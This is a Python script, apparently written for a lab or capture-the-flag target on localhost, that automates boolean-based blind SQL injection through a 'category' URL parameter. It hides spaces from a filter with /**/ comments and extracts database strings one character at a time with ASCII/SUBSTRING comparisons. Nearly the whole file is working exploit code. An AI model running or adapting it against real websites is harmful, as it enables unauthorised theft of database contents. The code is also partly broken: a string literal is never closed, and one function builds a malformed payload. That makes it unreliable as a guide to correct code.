import requests
import time

# Configuration
BASE_URL = "http://127.0.0.1:33050/"
TRUE_INDICATOR = "No posts found"
FALSE_INDICATOR = "Category does not exist"

def send_injection(payload_query, position=1):
    """
    Send boolean-based blind SQL injection query.
    Returns True if the character matches, False otherwise.
    """
    # Construct the payload with /**/ instead of spaces
    # Pattern: Nature'/**/AND/**/'CHAR'=(SELECT/**/LEFT([query],1))-- -
    payload = f"Nature'/**/AND/**/'CHAR'=(SELECT/**/LEFT({payload_query},{position}))--+-"
    
    resp = requests.get(f"{BASE_URL}?category={payload}", timeout=10)
    
    if TRUE_INDICATOR in resp.text:
        return True
    elif FALSE_INDICATOR in resp.text:
        return False
    else:
        print(f"[WARNING] Unexpected response: {resp.text[:200]}")
        return None

def extract_string(query, max_length=100):
    """
    Extract a string character by character using binary search or iteration.
    Using iterative approach for reliability.
    """
    result = ""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.$.!#%^&*()[]{}
    for pos in range(1, max_length + 1):
        found = False
        for char in chars:
            test_query = f"(SELECT/**/ASCII(SUBSTRING(({query}),{pos},1)))"
            # Use numeric comparison
            payload = f"Nature'/**/AND/**/{ord(char)}=(SELECT/**/ASCII(SUBSTRING(({query}),{pos},1)))--+-"
            
            resp = requests.get(f"{BASE_URL}?category={payload}", timeout=10)
            
            if TRUE_INDICATOR in resp.text:
                result += char
                print(f"  Position {pos}: '{char}' -> Current: {result}")
                found = True
                break
        
        if not found:
            # Try to detect end of string (null or empty)
            # Check if position is simply empty
            payload = f"Nature'/**/AND/**/0=(SELECT/**/LENGTH(SUBSTRING(({query}),{pos},1)))--+-"
            resp = requests.get(f"{BASE_URL}?category={payload}", timeout=10)
            if TRUE_INDICATOR in resp.text:
                print(f"  End of string at position {pos}")
                break
            else:
                # Unknown character, add placeholder
                result += "?"
                print(f"  Position {pos}: UNKNOWN -> Current: {result}")
    
    return result

